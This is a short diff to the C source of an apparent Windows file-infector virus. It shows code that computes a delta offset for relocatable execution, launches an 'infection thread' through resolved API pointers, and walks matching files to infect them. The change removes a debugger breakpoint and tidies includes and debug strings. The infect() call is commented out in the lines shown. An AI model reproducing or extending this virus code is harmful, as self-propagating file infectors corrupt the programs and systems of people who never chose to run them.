@@ -10,8 +10,8 @@
 #include "infect.h"
 #include "infection_thread.h"
 #include "oep.h"
-#include "utility.h"
 #include "string_generator.h"
+#include "utility.h"
 
 static DWORD WINAPI run(LPVOID param);
 
@@ -21,7 +21,7 @@ void spawn_infection_thread(void) {
     if (init_data(&data, (void *)code_begin, (void *)code_end,
                   (void *)spawn_infection_thread) == 0) {
         PRINT_DEBUG("delta offset is 0x%X", data.delta_offset);
-        asm("int3"); // TODO BEWARE OF ME!
+
         HANDLE hThread = data.function_list.create_thread(
             NULL, 0,
             (LPTHREAD_START_ROUTINE)((uint8_t *)run + data.delta_offset), NULL,
@@ -53,14 +53,15 @@ static DWORD WINAPI run(LPVOID param) {
         }
 
         memzero(&find_data, sizeof(WIN32_FIND_DATAA));
-        h_find = data.function_list.find_first_file_a(search_pattern, &find_data);
+        h_find =
+            data.function_list.find_first_file_a(search_pattern, &find_data);
         if (h_find != INVALID_HANDLE_VALUE) {
             do {
-                PRINT_DEBUG("infecting %s...", find_data.cFileName);
+                PRINT_DEBUG("infecting %s", find_data.cFileName);
                 /*if (infect(find_data.cFileName, &data) == 0)
-                    PRINT_DEBUG("success!\n");
+                    PRINT_DEBUG("success!");
                 else {
-                    PRINT_DEBUG("failure!\n");
+                    PRINT_DEBUG("failure!");
                 }*/
             } while (data.function_list.find_next_file_a(h_find, &find_data));
             data.function_list.find_close(h_find);
